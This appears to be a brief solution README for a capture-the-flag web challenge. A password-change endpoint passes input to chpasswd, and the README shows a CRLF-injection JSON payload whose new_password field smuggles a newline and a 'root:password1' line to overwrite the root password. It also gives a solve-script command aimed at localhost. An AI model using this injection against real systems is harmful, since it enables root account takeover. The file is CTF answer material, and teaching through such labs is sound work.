# Solution

* python3 -m pip install -r requests
* pthon3 solution/solve.py -u <http://127.0.0.1:9600> -p password1

## Challenge Outline

* Change password functionality is vulnerable to CRLF injection
* Chpasswd is being called under the hood
* Provide a valid input that will cause the root user's password to be overwritten, e.g:

```json
{"old_password":"www-data","new_password":"password1\nroot:password1"}
```
